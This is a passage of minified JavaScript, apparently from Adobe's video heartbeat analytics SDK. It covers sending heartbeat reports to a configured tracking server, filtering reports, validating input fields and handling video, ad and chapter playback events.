o=e.Event,i=e.URLRequestMethod,r=e.URLRequest,n=e.URLLoader,s=t.network.SettingsParser,d=t.model.QuerystringSerializer;a.prototype.destroy=function(){this._isDestroyed||(this._isDestroyed=!0,this._logger.debug(c,"#destroy()"),this._uninstallEventListeners())},a.prototype._onApiConfig=function(e){var t=e.data;this._logger.debug(c,"#_onApiConfig(sb_server="+t[l]+", check_status_server="+t[u]+", publisher="+t[g]+", quiet_mode="+t[p]+", ssl="+t[m]+")"),this._trackingServer=this._updateRequestProtocol(t[l],t[m]),this._checkStatusServer=this._updateRequestProtocol(t[u],t[m]),this._publisher=t[g],this._quietMode=t[p],this._isConfigured=!0},a.prototype._onUpdateVisitorOptOut=function(e){var t=e.data;this._logger.debug(c,"#_onUpdateVisitorOptOut(visitor_opt_out="+t[h]+")"),this._visitorOptedOut=t[h]},a.prototype._onFilterReportAvailable=function(e){var t=e.data;if(this._isConfigured){var a=t[_],s=this._serializer.serializeReport(a),d=this._trackingServer+"/?"+s.serializedOutput;if(this._prevReportSent&&this._prevReportSent.eventData&&a.eventData&&this._prevReportSent.eventData.playhead==a.eventData.playhead&&this._prevReportSent.eventData.ts==a.eventData.ts&&this._prevReportSent.eventData.prevTs==a.eventData.prevTs&&this._prevReportSent.eventData.type==a.eventData.type)this._logger.debug(c,"#_onFilterReportAvailable() > Duplicate heartbeat report not sent for URL:\n"+d);else{this._prevReportSent=a;var l=new r(d,i.GET);this._logger.debug(c,"#_onFilterReportAvailable() > "+l.url);var u=this;if(!this._quietMode&&!this._visitorOptedOut){var g=new n;g.addEventListener(o.SUCCESS,(function(e){g.close(),s.callback&&s.callback.call(null)}),this),g.addEventListener(o.ERROR,(function(e){g.close(),u._logger.warn(c,"#_onFilterReportAvailable() > Failed to send heartbeat report."),s.callback&&s.callback.call(null)}),this),g.load(l)}}}else this._logger.warn(c,"#_onFilterReportAvailable() > Unable to send request: not configured.")},a.prototype._onClockCheckStatusTick=function(e){if(this._isConfigured)if(this._publisher){var t=this,a=this._publisher.replace(/[^a-zA-Z0-9]+/,"-").toLocaleLowerCase(),d=this._checkStatusServer+a+".xml?r="+(new Date).getTime(),l=new r(d,i.GET),u=new n;u.addEventListener(o.SUCCESS,(function(e){if(e.data){var a=new s(e.data.response,t._logger).parse();a?t._channel.trigger(new o(w,a)):t._logger.warn(c,"#_onClockCheckStatusTick() > Failed to parse the config. settings.")}u.close()}),this),u.addEventListener(o.ERROR,(function(e){t._logger.warn(c,"#_onClockCheckStatusTick() > Failed to obtain the config. settings."),u.close()}),this),this._logger.debug(c,"#_onClockCheckStatusTick() > Get new settings from: "+d),u.load(l)}else this._logger.warn(c,"#_onClockCheckStatusTick() > Publisher is NULL.");else this._logger.warn(c,"#_onClockCheckStatusTick() > Unable to send request: not configured.")},a.prototype._updateRequestProtocol=function(e,t){var a=e;return 0===a.indexOf("http://")?a=a.slice(7):0===a.indexOf("https://")&&(a=a.slice(8)),t?"https://"+a:"http://"+a},a.prototype._installEventListeners=function(){this._channel.on(y,this._onApiConfig,this),this._channel.on(v,this._onUpdateVisitorOptOut,this),this._channel.on(f,this._onFilterReportAvailable,this),this._channel.on(b,this._onClockCheckStatusTick,this)},a.prototype._uninstallEventListeners=function(){this._channel.off(null,null,this)};var c="ah::Network",l="tracking_server",u="check_status_server",g="publisher",p="quiet_mode",m="ssl",_="report",h="visitor_opt_out",y="api:config",v="api:update_visitor_optout",f="filter:data_available",b="clock:check_status.tick",w="net:check_status_complete";t.network.Network=a}(e.ADB.core,t),function(e,t){"use strict";function a(e,t){if(!e)throw new Error("Reference to the channel object cannot be NULL");if(this._channel=e,!t)throw new Error("Reference to the logger object cannot be NULL");this._logger=t,this._isDestroyed=!1,this._isBufferingInProgress=!1,this._reportBuffer={},this._tsHistory={},this._workQueue=new s,this._installEventListeners()}function o(e){var t=[];return e&&e.forEach((function(e){e.eventData.type()==c.EVENT_TYPE_PAUSE||e.eventData.type()==c.EVENT_TYPE_STALL||e.eventData.type()==c.EVENT_TYPE_BUFFER?(!e.filterReport||e.eventData.duration()>f)&&t.push(e):t.push(e)})),t}function i(e){var t=-1,a=-1,o=[];return e.forEach((function(e){e.eventData.type()==c.EVENT_TYPE_START?e.assetData.type()==l.TYPE_MAIN_CONTENT?-1==t?t=o.push(e)-1:(e.eventData.prevTs(-1),o[t]=e):-1==a?a=o.push(e)-1:(e.eventData.prevTs(-1),o[a]=e):o.push(e)})),o}function r(e){var t=[];return e.forEach((function(a){if(a.eventData.type()==c.EVENT_TYPE_PLAY){if(a.eventData.duration()>v)t.push(a);else if(0==a.eventData.duration()&&a.assetData.type()==l.TYPE_MAIN_CONTENT){var o=function(e){var t=[];return e.forEach((function(e){e.eventData.type()!=c.EVENT_TYPE_PLAY&&e.eventData.type()!=c.EVENT_TYPE_BUFFER&&e.eventData.type()!=c.EVENT_TYPE_START||t.push(e)})),t}(e);o.indexOf(a)==o.length-1&&t.push(a)}}else t.push(a)})),t}var n=e.radio.Command,s=e.radio.CommandQueue,d=e.Event,c=t.model.EventDao,l=t.model.AssetDao;a.prototype.destroy=function(){this._isDestroyed||(this._isDestroyed=!0,this._logger.debug(w,"#destroy()"),this._uninstallEventListeners(),this.clear())},a.prototype.clear=function(){this._logger.debug(w,"#clear()"),this._workQueue.cancelAllCommands(),this._reportBuffer={},this._tsHistory={},this._isBufferingInProgress=!1},a.prototype.flush=function(){this._workQueue.addCommand(new n(this._flushBufferReport,this))},a.prototype._bufferReport=function(e){if(!this._isDestroyed){var t=e[_];if(t){var a=t.sessionData.sessionId();this._reportBuffer[a]=this._reportBuffer[a]||[],this._reportBuffer[a].push(t)}if(!this._isBufferingInProgress){this._isBufferingInProgress=!0;var o={};o[m]=!0,o[h]=1,this._channel.command(y,o)}}},a.prototype._flushBufferReport=function(){function e(e){if(e)for(var a=0;a<e.length;a++){var o=e[a],i=o.sessionData.sessionId();t._tsHistory[i]=t._tsHistory[i]||{};var r=o.eventData.type()+"."+(o.assetData.type()==l.TYPE_AD?o.assetData.adData().adId():o.assetData.videoId());t._tsHistory[i].hasOwnProperty(r)&&o.eventData.prevTs(t._tsHistory[i][r]),t._tsHistory[i][r]=o.eventData.ts()}}if(!this._isDestroyed){var t=this;for(var a in this._reportBuffer)if(this._reportBuffer.hasOwnProperty(a)){var n=r(i(o(this._reportBuffer[a])));e(n);for(var s=0;s<n.length;s++){var c=n[s],u={};u[_]=c,this._channel.trigger(new d(g,u))}}this._reportBuffer={};var p=this._channel.request(b),m=this._tsHistory[p]||{};this._tsHistory={},this._tsHistory[p]=m,this._isBufferingInProgress=!1}},a.prototype._onContextReportAvailable=function(e){var t=e.data;this._workQueue.addCommand(new n(this._bufferReport,this,[t]))},a.prototype._onClockFlushFilterTick=function(e){this.flush()},a.prototype._installEventListeners=function(){this._channel.on(u,this._onContextReportAvailable,this),this._channel.on(p,this._onClockFlushFilterTick,this)},a.prototype._uninstallEventListeners=function(){this._channel.off(null,null,this)};var u="context:report_available",g="filter:data_available",p="clock:flush_filter.tick",m="reset",_="report",h="repeat_count",y="clock:flush_filter.resume",v=250,f=250,b="session_id",w="ah::ReportFilter";t.filter.ReportFilter=a}(e.ADB.core,t),function(e,t){"use strict";function a(e,t){this._onFail={fn:e,ctx:t}}var o=e.ErrorInfo;a.prototype.validateFields=function(e,t){if(!e)return this._fail("Data cannot be null");if(t)for(var a=0;a<t.length;a++){var o=t[a];switch(o){case"videoId":if(!e.hasOwnProperty("videoId"))return this._fail("The ID for the main video must be specified.");if("string"!=typeof e.videoId)return this._fail("The ID for the main video must be a String.");if(""===e.videoId)return this._fail("The ID for the main video cannot be an empty string.");break;case"streamType":if(!e.hasOwnProperty("streamType"))return this._fail("The stream type for the main video must be specified.");if("string"!=typeof e.streamType)return this._fail("The stream type for the main video must be a String.");if(""===e.streamType)return this._fail("The stream type for the main video cannot be an empty string.");break;case"videoLength":if(!e.hasOwnProperty("videoLength"))return this._fail("The length of the main video must be specified.");if("number"!=typeof e.videoLength)return this._fail("The length of the main video must be a Number.");if(isNaN(e.videoLength))return this._fail("The length of the main video cannot be NaN.");break;case"playhead":if(!e.hasOwnProperty("playhead"))return this._fail("The playhead for the main video must be specified.");if("number"!=typeof e.playhead)return this._fail("The playhead for the main video must be a Number.");if(isNaN(e.playhead))return this._fail("The playhead for the main video cannot be NaN.");break;case"playerName":if(!e.hasOwnProperty("playerName"))return this._fail("The player name for the main video must be specified.");if("string"!=typeof e.playerName)return this._fail("The player name for the main video must be a String.");if(""===e.playerName)return this._fail("The player name for the main video cannot be an empty string.");break;case"rsid":if(!e.hasOwnProperty("rsid"))return this._fail("account (rsid) is required and has to be set in the AppMeasurement instance.");if("string"!=typeof e.rsid)return this._fail("account (rsid) of the AppMeasurement instance must be a String.");if(""===e.rsid)return this._fail("account (rsid) of the AppMeasurement instance  cannot be an empty string.");break;case"trackingServer":if(!e.hasOwnProperty("trackingServer"))return this._fail("trackingServer is required and has to be set in the AppMeasurement instance.");if("string"!=typeof e.trackingServer)return this._fail("trackingServer of the AppMeasurement instance must be a String.");if(""===e.trackingServer)return this._fail("trackingServer of the AppMeasurement instance cannot be an empty string.");break;case"podPlayerName":if(!e.hasOwnProperty("podPlayerName"))return this._fail("The player name for the ad-break must be specified.");if("string"!=typeof e.podPlayerName)return this._fail("The player name for the ad-break must be a String.");if(""===e.podPlayerName)return this._fail("The player name for the ad-break cannot be an empty string.");break;case"podPosition":if(!e.hasOwnProperty("podPosition"))return this._fail("Position (index) of the ad-break must be specified.");if("number"!=typeof e.podPosition)return this._fail("Position (index) of the ad-break must be a Number.");if(isNaN(e.podPosition))return this._fail("Position (index) of the ad-break cannot be NaN.");break;case"adId":if(!e.hasOwnProperty("adId"))return this._fail("The ad ID must be specified.");if("string"!=typeof e.adId)return this._fail("The ad ID must be a String.");if(""===e.adId)return this._fail("The ad ID cannot be an empty string.");break;case"adPosition":if(!e.hasOwnProperty("adPosition"))return this._fail("Position (index) of the ad must be specified.");if("number"!=typeof e.adPosition)return this._fail("Position (index) of the ad must be a Number.");if(isNaN(e.adPosition))return this._fail("Position (index) of the ad cannot be NaN.");break;case"chapterPosition":if(!e.hasOwnProperty("chapterPosition"))return this._fail("Position (index) of the chapter must be specified.");if("number"!=typeof e.chapterPosition)return this._fail("Position (index) of the chapter must be a Number.");if(isNaN(e.chapterPosition))return this._fail("Position (index) of the chapter cannot be NaN.");break;case"chapterOffset":if(!e.hasOwnProperty("chapterOffset"))return this._fail("Chapter start-time (offset) must be specified.");if("number"!=typeof e.chapterOffset)return this._fail("Chapter start-time (offset) must be a Number.");if(isNaN(e.chapterOffset))return this._fail("Chapter start-time (offset) cannot be NaN.");break;case"chapterLength":if(!e.hasOwnProperty("chapterLength"))return this._fail("The length of the chapter must be specified.");if("number"!=typeof e.chapterLength)return this._fail("The length of the chapter must be a Number.");if(isNaN(e.chapterLength))return this._fail("The length of the chapter cannot be NaN.");break;default:return this._fail("Unable to validate unknown parameter: "+o)}}return!0},a.prototype._fail=function(e){var t=new o("Invalid input data",e);return this._onFail.fn&&this._onFail.fn.call(this._onFail.ctx,t),!1},t.context.InputDataValidator=a}(e.ADB.va,t),function(e,t){"use strict";function a(e,t){if(!t)throw new Error("Reference to the logger object cannot be NULL");if(this._logger=t,!e)throw new Error("Reference to the context object cannot be NULL");this._context=e}var o=t.model.Report;a.prototype.createReportForItem=function(e){return this._logger.debug(i,"Creating report for item: "+e.eventData.type()),new o(this._context._adobeAnalyticsData,this._context._userData,this._context._aamData,this._context._serviceProviderData,this._context._sessionData,e)};var i="ah::ReportFactory";t.context.ReportFactory=a}(e.ADB.core,t),function(e,t,a,o){"use strict";function i(e,t){if(!e)throw new Error("Reference to the channel object cannot be NULL");if(this._channel=e,!t)throw new Error("Reference to the logger object cannot be NULL");this._logger=t,this._lastInBandItem=null,this._stashedLastInBandItem=null,this._stashedMainMetadata=null,this._autoComputedStartupTime=0,this._reportingInterval=ge,this._assetData=null,this._streamData=null,this._qosData=null,this._sessionData=null,this._cuserData=null,this._adobeAnalyticsData=new c,this._serviceProviderData=new l,this._userData=new u,this._aamData=new g,this._isTrackingSessionActive=!1,this._isVideoComplete=!1,this._isDestroyed=!1,this._doNotOverrideEventDuration=!1,this._reportFactory=new b(this,this._logger),this._inputDataValidator=new w((function(e){this._logger.error(k,e.getMessage()+" | "+e.getDetails()),this._channel.trigger(new s(S,e))}),this),this._trackExternalErrors=!0,this._installEventListeners()}var r=a.md5,n=a.ObjectUtils,s=e.Event,d=o.model.SessionDao,c=o.model.AdobeAnalyticsDao,l=o.model.ServiceProviderDao,u=o.model.UserDao,g=o.model.AudienceManagerDao,p=o.model.EventDao,m=o.model.AssetDao,_=o.model.StreamDao,h=o.model.QoSDao,y=o.model.AdDao,v=o.model.ChapterDao,f=o.model.TrackItem,b=o.context.ReportFactory,w=o.context.InputDataValidator;i.prototype.destroy=function(){this._isDestroyed||(this._isDestroyed=!0,this._logger.debug(k,"#destroy()"),this._uninstallEventListeners())},i.prototype._onApiAnalyticsStart=function(e){this._logger.debug(k,"#_onApiAnalyticsStart()");var t=e.data;if(this._checkCall("_onApiAnalyticsStart")&&this._inputDataValidator.validateFields(t,["playhead"])){this._userData.visitorId(t.vid),this._userData.analyticsVisitorId(t.aid),this._userData.marketingCloudVisitorId(t.mid),this._aamData.audienceManagerBlob(t.blob),this._aamData.audienceManagerLocationHint(t.loc_hint),t.customerIDs&&(this._cuserData=t.customerIDs),this._updateQoSInfo(t);var a=new f(this,p.EVENT_TYPE_AA_START,t.playhead,null,t._eventData[A]);a.assetData.adData(null),a.assetData.type(m.TYPE_MAIN_CONTENT),this._cuserData=null,this._sendHit(a)}},i.prototype._onApiAnalyticsAdStart=function(e){this._logger.debug(k,"#_onApiAnalyticsAdStart()");var t=e.data;if(this._checkCall("_onApiAnalyticsAdStart")&&this._inputDataValidator.validateFields(t,["playhead"])){this._updateQoSInfo(t);var a=new f(this,p.EVENT_TYPE_AA_AD_START,t.playhead,null,t._eventData[A]);this._sendHit(a)}},i.prototype._onApiVideoLoad=function(e){var t=e.data;this._logger.debug(k,"#_onApiVideoLoad(rsid="+t.rsid+", aa_trackingServer="+t.trackingServer+")"),this._resetInternalState(),this._inputDataValidator.validateFields(t,["rsid","trackingServer"])&&(this._sessionData.sessionId(this._generateSessionId()),this._isTrackingSessionActive=!0)},i.prototype._onApiVideoUnload=function(e){this._logger.debug(k,"#_onApiVideoUnload()"),this._isTrackingSessionActive?this._isTrackingSessionActive=!1:this._logger.debug(k,"#_onApiVideoUnload() > No active tracking session.")},i.prototype._onApiVideoStart=function(e){var t=e.data;if(this._logger.debug(k,"#_onApiVideoStart(id="+t.videoId+", name="+t.videoName+", length="+t.videoLength+", type="+t.streamType+", playerName="+t.playerName+")"),this._checkCall("_onApiVideoStart")&&this._inputDataValidator.validateFields(t,["videoId","streamType","videoLength","playhead","playerName"])){this._lastInBandItem=null,this._stashedLastInBandItem=null,this._adobeAnalyticsData.reportSuiteId(t.rsid),this._adobeAnalyticsData.trackingServer(t.trackingServer),this._adobeAnalyticsData.ssl(Number(t.useSsl)),this._serviceProviderData.ovp(t.ovp),this._serviceProviderData.sdk(t.sdk),this._serviceProviderData.channel(t.channel),this._serviceProviderData.libVersion(t.version),this._serviceProviderData.apiLevel(t.apiLvl),this._serviceProviderData.playerName(t.playerName),this._assetData.adData(null),this._assetData.chapterData(null),this._assetData.videoId(t.videoId),this._assetData.length(t.videoLength),this._assetData.type(m.TYPE_MAIN_CONTENT),this._assetData.publisher(t.publisher),this._assetData.name(t.videoName),this._streamData.type(t.streamType),this._updateQoSInfo(t);var a=t.metaNielsen?n.merge(t.metaVideo,t.metaNielsen):t.metaVideo,o=new f(this,p.EVENT_TYPE_START,t.playhead,a,t._eventData[A]);this._sendHit(o)}},i.prototype._onApiVideoResume=function(e){var t=e.data;if(this._logger.debug(k,"#_onApiVideoResume(id="+t.videoId+", name="+t.videoName+", length="+t.videoLength+", type="+t.streamType+", playerName="+t.playerName+")"),this._checkCall("_onApiVideoResume")&&this._inputDataValidator.validateFields(t,["videoId","streamType","videoLength","playhead","playerName"])){this._assetData.videoId(t.videoId),this._assetData.length(t.videoLength),this._assetData.type(m.TYPE_MAIN_CONTENT),this._assetData.name(t.videoName),this._streamData.type(t.streamType);var a=new f(this,p.EVENT_TYPE_RESUME,t.playhead,null,t._eventData[A]);this._sendHit(a)}},i.prototype._onApiVideoSessionEnd=function(e){this._logger.debug(k,"#_onApiVideoSessionEnd()");var t=e.data;if(this._checkCall("_onApiVideoSessionEnd")&&this._inputDataValidator.validateFields(t,["playhead"])){var a=new f(this,p.EVENT_TYPE_END,t.playhead,null,t._eventData[A]);a.assetData.adData(null),a.assetData.type(m.TYPE_MAIN_CONTENT),this._sendHit(a)}},i.prototype._onApiVideoComplete=function(e){this._logger.debug(k,"#_onApiVideoComplete()");var t=e.data;if(this._checkCall("_onApiVideoComplete")){var a=new f(this,p.EVENT_TYPE_COMPLETE,this._assetData.length(),null,t._eventData[A]);this._sendHit(a),this._isVideoComplete=!0}},i.prototype._onApiVideoSkip=function(e){this._logger.debug(k,"#_onApiVideoSkip()");var t=e.data;if(this._checkCall("_onApiVideoSkip")){var a=new f(this,p.EVENT_TYPE_SKIP,t.playhead,null,t._eventData[A]);this._sendHit(a),this._isVideoComplete=!0}},i.prototype._onApiPlay=function(e){this._logger.debug(k,"#_onApiPlay()");var t=e.data;if(this._checkCall("_onApiPlay")&&this._inputDataValidator.validateFields(t,["playhead"])){this._updateQoSInfo(t);var a=new f(this,p.EVENT_TYPE_PLAY,t.playhead,null,t._eventData[A]);this._sendHit(a)}},i.prototype._onApiPause=function(e){this._logger.debug(k,"#_onApiPause()");var t=e.data;if(this._checkCall("_onApiPause")&&this._inputDataValidator.validateFields(t,["playhead"])){this._updateQoSInfo(t);var a=t.playheadStalled?p.EVENT_TYPE_STALL:p.EVENT_TYPE_PAUSE,o=new f(this,a,t.playhead,null,t._eventData[A]);t._eventData.hasOwnProperty(L)&&(o.filterReport=t._eventData[L]),this._sendHit(o)}},i.prototype._onApiBufferStart=function(e){this._logger.debug(k,"#_onApiBufferStart()");var t=e.data;if(this._checkCall("_onApiBufferStart")&&this._inputDataValidator.validateFields(t,["playhead"])){this._updateQoSInfo(t);var a=new f(this,p.EVENT_TYPE_BUFFER,t.playhead,null,t._eventData[A]);this._sendHit(a)}},i.prototype._onApiAdBreakStart=function(e){this._logger.debug(k,"#_onApiAdBreakStart()");var t=e.data;this._checkCall("_onApiAdBreakStart")&&this._inputDataValidator.validateFields(t,["playhead"])&&(this._flushLastInbandItem(t),this._updateLastInbandItemToBuffering())},i.prototype._onApiAdBreakComplete=function(e){this._logger.debug(k,"#_onApiAdBreakComplete()");var t=e.data;this._checkCall("_onApiAdBreakComplete")&&this._inputDataValidator.validateFields(t,["playhead"])&&(this._flushLastInbandItem(t),this._restoreLastInbandItem())},i.prototype._onApiAdStart=function(e){var t=e.data;if(this._logger.debug(k,"#_onApiAdStart(id="+t.adId+", player_name="+t.podPlayerName+", parent_name="+this._assetData.videoId()+", pod_pos="+t.adPosition+")"),this._checkCall("_onApiAdStart")&&this._inputDataValidator.validateFields(t,["playhead","podPosition","podPlayerName","adId","adPosition"])){var a=new y;a.adId(t.adId),a.adName(t.adName),a.adLength(t.adLength),a.resolver(t.podPlayerName),a.podId(r(this._assetData.videoId())+"_"+t.podPosition),a.podPosition(t.adPosition+""),a.podName(t.podName),a.podOffset(t.podSecond),a.sid(this._generateSessionId()),this._assetData.adData(a),this._assetData.type(m.TYPE_AD),this._updateQoSInfo(t);var o=n.merge(t.metaVideo,t.metaAd);o=t.metaNielsen?n.merge(o,t.metaNielsen):o,o=t.metaAdNielsen?n.merge(o,t.metaAdNielsen):o;var i=new f(this,p.EVENT_TYPE_START,t.playhead,o,t._eventData[A]);if(this._sendHit(i),this._restoreLastInbandItem(),t.adGranularTracking){var s=t.adTrackingInterval?t.adTrackingInterval:this._reportingInterval;this._updateReportingInterval(s,!0)}}},i.prototype._onApiAdComplete=function(e){this._logger.debug(k,"#_onApiAdComplete()");var t=e.data;if(this._checkCall("_onApiAdComplete")&&this._inputDataValidator.validateFields(t,["playhead"])){if(this._assetData.type()!=m.TYPE_AD)return void this._logger.warn(k,"#_onApiAdComplete() > Ignoring the ad complete event, because we are no longer in an ad.");this._updateQoSInfo(t);var a=new f(this,p.EVENT_TYPE_COMPLETE,t.playhead,null,t._eventData[A]);this._sendHit(a),this._updateLastInbandItemToBuffering(),this._assetData.adData(null),this._assetData.type(m.TYPE_MAIN_CONTENT),this._updateReportingInterval(this._reportingInterval,!1)}},i.prototype._onApiAdSkip=function(e){this._logger.debug(k,"#_onApiAdSkip()");var t=e.data;if(this._checkCall("_onApiAdSkip")&&this._inputDataValidator.validateFields(t,["playhead"])){if(this._assetData.type()!=m.TYPE_AD)return void this._logger.warn(k,"#_onApiAdSkip() > Ignoring the ad skip event, because we are no longer in an ad.");this._updateQoSInfo(t);var a=new f(this,p.EVENT_TYPE_SKIP,t.playhead,null,t._eventData[A]);this._sendHit(a),this._updateLastInbandItemToBuffering(),this._assetData.adData(null),this._assetData.type(m.TYPE_MAIN_CONTENT),this._updateReportingInterval(this._reportingInterval,!1)}},i.prototype._onApiChapterStart=function(e){var t=e.data;if(this._logger.debug(k,"#_onApiChapterStart(name="+t.chapterName+", length="+t.chapterLength+", position="+t.chapterPosition+", chapter_offset="+t.chapterOffset+")"),this._checkCall("_onApiChapterStart")&&this._inputDataValidator.validateFields(t,["playhead","chapterPosition","chapterOffset","chapterLength"])){var a=new v;a.id(r(this._assetData.videoId())+"_"+t.chapterPosition),a.name(t.chapterName),a.length(t.chapterLength),a.position(t.chapterPosition),a.offset(t.chapterOffset),a.sid(this._generateSessionId()),this._assetData.chapterData(a),this._updateQoSInfo(t);var o=n.merge(t.metaVideo,t.metaChapter),i=new f(this,p.EVENT_TYPE_CHAPTER_START,t.playhead,o,t._eventData[A]);i.assetData.adData(null),i.assetData.type(m.TYPE_MAIN_CONTENT),this._sendHit(i)}},i.prototype._onApiChapterComplete=function(e){this._logger.debug(k,"#_onApiChapterComplete()");var t=e.data;if(this._checkCall("_onApiChapterComplete")&&this._inputDataValidator.validateFields(t,["playhead"])){if(!this._assetData.chapterData())return void this._logger.warn(k,"#_onApiChapterComplete() > Ignoring the chapter complete event, because we are no longer in a chapter.");this._updateQoSInfo(t);var a=new f(this,p.EVENT_TYPE_CHAPTER_COMPLETE,t.playhead,null,t._eventData[A]);a.assetData.adData(null),a.assetData.type(m.TYPE_MAIN_CONTENT),this._sendHit(a),this._assetData.chapterData(null)}},i.prototype._onApiChapterSkip=function(e){this._logger.debug(k,"#_onApiChapterSkip()");var t=e.data;if(this._checkCall("_onApiChapterSkip")&&this._inputDataValidator.validateFields(t,["playhead"])){if(!this._assetData.chapterData())return void this._logger.warn(k,"#_onApiChapterSkip() > Ignoring the chapter skip event, because we are no longer in a chapter.");this._updateQoSInfo(t);var a=new f(this,p.EVENT_TYPE_CHAPTER_SKIP,t.playhead,null,t._eventData[A]);a.assetData.adData(null),a.assetData.type(m.TYPE_MAIN_CONTENT),this._sendHit(a),this._assetData.chapterData(null)}},i.prototype._onApiBitrateChange=function(e){this._logger.debug(k,"#_onApiBitrateChange()");var t=e.data;if(this._checkCall("_onApiBitrateChange")&&this._inputDataValidator.validateFields(t,["playhead"])){this._updateQoSInfo(t);var a=new f(this,p.EVENT_TYPE_BITRATE_CHANGE,t.playhead,null,t._eventData[A]);this._sendHit(a)}},i.prototype._onApiTrackError=function(e){var t=e.data;if(this._logger.debug(k,"#_onApiTrackError(source="+t._eventData.source+", err_id="+t._eventData.error_id+")"),this._isTrackingSessionActive){if(this._trackExternalErrors||t._eventData.source===T){this._updateQoSInfo(t);var a=new f(this,p.EVENT_TYPE_ERROR,0,null,t._eventData[A]);a.eventData.id(t._eventData.error_id),a.eventData.source(t._eventData.source),this._sendHit(a)}}else this._logger.warn(k,"#_onApiTrackError() > No active tracking session.")},i.prototype._onApiTrackInternalError=function(e){var t=e.data;this._logger.debug(k,"#_onApiTrackInternalError(source="+t.source+", err_id="+t.error_id+")"),this._updateQoSInfo(t);var a=new f(this,p.EVENT_TYPE_ERROR,0);a.eventData.id(t.error_id),a.eventData.source(t.source),this._sendHit(a)},i.prototype._onApiQuantumEnd=function(e){this._logger.debug(k,"#_onApiQuantumEnd(interval="+this._channel.request(I)+")");var t=e.data;if(this._checkCall("_onApiQuantumEnd")&&this._inputDataValidator.validateFields(t,["playhead"])){var a=this._lastInBandItem;if(a){this._updateQoSInfo(t);var o=new f(this,a.eventData.type(),t.playhead,a.meta,a.callback);o.filterReport=a.filterReport,this._sendHit(o,!0)}}},i.prototype._onNetworkCheckStatusComplete=function(e){var t=e.data;this._trackExternalErrors=t[x],this._reportingInterval=t[j],this._reportingInterval||(this._reportingInterval=ge),this._logger.debug(k,"#_onNetworkCheckStatusComplete(track_ext_err="+this._trackExternalErrors+")")},i.prototype._onResetSessionId=function(e){var t=this._generateSessionId();this._sessionData=new d,this._sessionData.sessionId(t),this._logger.debug(k,"#_resetSessionId(new sessionId="+t+")")},i.prototype._installEventListeners=function(){this._channel.on(R,this._onApiAnalyticsStart,this),this._channel.on(M,this._onApiAnalyticsAdStart,this),this._channel.on(O,this._onApiVideoLoad,this),this._channel.on(Q,this._onApiVideoUnload,this),this._channel.on(B,this._onApiVideoStart,this),this._channel.on(U,this._onApiVideoComplete,this),this._channel.on(F,this._onApiVideoSkip,this),this._channel.on($,this._onApiVideoResume,this),this._channel.on(H,this._onApiVideoSessionEnd,this),this._channel.on(K,this._onApiAdBreakStart,this),this._channel.on(Y,this._onApiAdBreakComplete,this),this._channel.on(G,this._onApiAdStart,this),this._channel.on(z,this._onApiAdComplete,this),this._channel.on(W,this._onApiAdSkip,this),this._channel.on(X,this._onApiPlay,this),this._channel.on(J,this._onApiPause,this),this._channel.on(Z,this._onApiBufferStart,this),this._channel.on(ee,this._onApiChapterStart,this),this._channel.on(te,this._onApiChapterComplete,this),this._channel.on(ae,this._onApiChapterSkip,this),this._channel.on(re,this._onApiBitrateChange,this),this._channel.on(oe,this._onApiTrackError,this),this._channel.on(ie,this._onApiTrackInternalError,this),this._channel.on(ne,this._onApiQuantumEnd,this),this._channel.on(de,this._onNetworkCheckStatusComplete,this),this._channel.on(C,this._onResetSessionId,this),this._channel.reply(P,(function(){return this._sessionData&&this._sessionData.sessionId()?this._sessionData.sessionId():null}),this)},i.prototype._uninstallEventListeners=function(){this._channel.off(null,null,this)},i.prototype._resetInternalState=function(){this._logger.debug(k,"#_resetInternalState()"),this._isTrackingSessionActive=!1,this._isVideoComplete=!1,this._autoComputedStartupTime=0,this._lastInBandItem=null,this._stashedLastInBandItem=null,this._streamData=new _,this._qosData=new h,this._sessionData=new d,this._assetData=new m,this._cuserData=null},i.prototype._generateSessionId=function(){return""+(new Date).getTime()+Math.floor(1e9*Math.random())},i.prototype._updateQoSInfo=function(e){this._qosData.bitrate(e.bitrate||0),this._qosData.fps(e.fps||0),this._qosData.droppedFrames(e.droppedFrames||0),null==e.startupTime||isNaN(e.startupTime)?(this._qosData.startupTime(this._autoComputedStartupTime),this._qosData.isStartupTimeOverridden=!1):(this._qosData.startupTime(e.startupTime),this._qosData.isStartupTimeOverridden=!0)},i.prototype._checkCall=function(e){return this._isTrackingSessionActive?!this._isVideoComplete||"_onApiVideoSessionEnd"===e||(this._logger.warn(k,"#"+e+"() > The video content already completed."),!1):(this._logger.warn(k,"#"+e+"() > No active tracking session."),!1)},i.prototype._updateReportingInterval=function(e,t){var a={};a[V]=!!t,a[j]=e,this._channel.trigger(new s(ce,a))},i.prototype._updateLastInBandItem=function(e){var t=this._lastInBandItem,a=(new Date).getTime(),o=t.assetData.type()===m.TYPE_AD||e.assetData.type()===m.TYPE_AD,i=1e3*Math.abs(e.eventData.playhead()-t.eventData.playhead()),r=Math.abs(a-t.eventData.ts()),n=Math.abs(i-r),s=r;s>le?(this._logger.warn(k," Resetting duration in lastInBandItem["+t.assetData.type()+":"+t.eventData.type()+"] call to 0 as calculated duration ("+s+")exceeds 10mins"),s=0):t.eventData.type()==p.EVENT_TYPE_PLAY&&!o&&!this._doNotOverrideEventDuration&&n>ue&&(s=Math.min(i,r),this._logger.warn(k," Resetting duration in lastInBandItem["+t.assetData.type()+":"+t.eventData.type()+"] call to "+s+" as calculated error delta ("+n+")exceeds 2sec")),this._doNotOverrideEventDuration=!1,t.eventData.duration(s),t.eventData.ts(a),t.eventData.playhead(e.eventData.playhead()),t.qosData.startupTime(e.qosData.startupTime()),t.qosData.isStartupTimeOverridden=e.qosData.isStartupTimeOverridden},i.prototype._updateLastInbandItemToBuffering=function(){this._stashedLastInBandItem=this._lastInBandItem;var e=0;null!=this._lastInBandItem&&(this._lastInBandItem.assetData.type()==m.TYPE_MAIN_CONTENT&&this._lastInBandItem.eventData.type()==p.EVENT_TYPE_START&&(this._stashedMainMetadata=this._lastInBandItem.meta),e=this._lastInBandItem.eventData.playhead());var t=new f(this,p.EVENT_TYPE_BUFFER,e,null,null);t.assetData.adData(null),t.assetData.type(m.TYPE_MAIN_CONTENT),this._lastInBandItem=t},i.prototype._restoreLastInbandItem=function(){if(null!=this._stashedLastInBandItem){var e=null;this._stashedLastInBandItem.eventData.type()==p.EVENT_TYPE_START&&(this._lastInBandItem.assetData.type()==m.TYPE_AD?e=this._lastInBandItem.meta:(e=this._stashedMainMetadata,this._stashedMainMetadata=null));var t=new 